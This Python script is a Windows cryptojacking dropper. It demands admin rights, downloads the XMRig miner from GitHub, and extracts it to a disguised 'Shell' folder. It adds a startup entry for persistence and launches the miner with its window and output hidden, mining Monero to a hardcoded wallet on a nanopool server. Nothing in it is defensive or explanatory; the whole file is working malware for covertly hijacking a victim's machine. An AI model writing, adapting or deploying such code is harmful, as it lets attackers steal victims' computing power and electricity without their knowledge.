import os
import zipfile
import subprocess
import requests
import sys
import ctypes
from tkinter import messagebox, Tk

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

if not is_admin():
    root = Tk()
    root.withdraw()
    messagebox.showwarning("Admin Privileges Required", "This script must be run as Administrator!")
    sys.exit(1)

URL = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-gcc-win64.zip"
FILENAME = "C:\\Program Files (x86)\\Shell\\xmrig-6.22.2-gcc-win64.zip"
EXTRACT_DIR = "C:\\Program Files (x86)\\Shell"
BITCOIN_ADDRESS = "82WFpBT3pLrBHDHXpe5TL2cQLEepYDieiDMZADyb3pHLd8oQCrMLs44WCi8vBN3aT8AkbRXnhry5JFEdyS9nzWSP6jDNWn1"
STARTUP_PATH = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup", "xmrig_startup.bat")

response = requests.get(URL, stream=True)
with open(FILENAME, "wb") as file:
    for chunk in response.iter_content(chunk_size=1024):
        if chunk:
            file.write(chunk)

with zipfile.ZipFile(FILENAME, "r") as zip_ref:
    zip_ref.extractall(EXTRACT_DIR)

extracted_folders = [f for f in os.listdir(EXTRACT_DIR) if os.path.isdir(os.path.join(EXTRACT_DIR, f)) and "xmrig" in f.lower()]
if extracted_folders:
    extracted_dir = os.path.join(EXTRACT_DIR, extracted_folders[0])
    xmrig_path = os.path.join(extracted_dir, "xmrig.exe")
    os.chdir(extracted_dir)
    
    with open(STARTUP_PATH, "w") as vbs_file:
        vbs_file.write(f'''Set WshShell = CreateObject("WScript.Shell") 
    WshShell.Run """{xmrig_path}"" -o xmr-us-east1.nanopool.org:14433 -u {BITCOIN_ADDRESS} --tls --coin monero", 0, False
    ''')


    
    subprocess.Popen(
        [xmrig_path, "-o", "xmr-us-east1.nanopool.org:14433", "-u", BITCOIN_ADDRESS, "--tls", "--coin", "monero"],
        creationflags=subprocess.CREATE_NO_WINDOW,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
